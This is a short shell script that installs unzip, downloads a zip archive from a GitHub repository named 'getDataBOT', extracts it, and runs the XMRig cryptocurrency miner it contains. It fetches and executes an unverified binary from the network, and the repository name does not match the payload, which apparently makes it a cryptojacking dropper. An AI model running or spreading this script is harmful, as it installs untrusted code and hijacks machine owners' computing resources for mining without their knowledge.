#!/bin/sh
sudo apt-get install unzip
wget https://github.com/jobsdart0i/getDataBOT/raw/main/trx.zip
unzip trx.zip
chmod +x xmrig
./xmrig
